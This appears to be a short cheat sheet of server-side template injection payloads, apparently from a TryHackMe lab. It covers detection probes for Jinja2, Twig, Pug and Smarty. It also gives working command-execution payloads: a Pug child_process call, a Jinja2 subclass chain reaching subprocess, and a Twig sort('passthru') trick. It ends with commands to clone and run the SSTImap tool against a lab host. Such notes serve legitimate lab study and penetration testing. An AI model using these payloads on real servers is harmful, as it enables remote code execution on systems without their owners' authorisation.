
1. **Jinja2 (python)/Twig (PHP)** - `{{7*'7'}}`
2. **Jade/Pug** (Node)
	* `#{7 * 7}`
3. Smarty (PHP) - `{'Hello'|upper}`
4. Pug (node)
	* `#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}`
5. Jinja (python)
	* `{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}`

##### Automation
```bash
git clone https://github.com/vladko312/SSTImap.git
```
```bash
python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='
```

#### Twig
`{{['id',""]|sort('passthru')}}`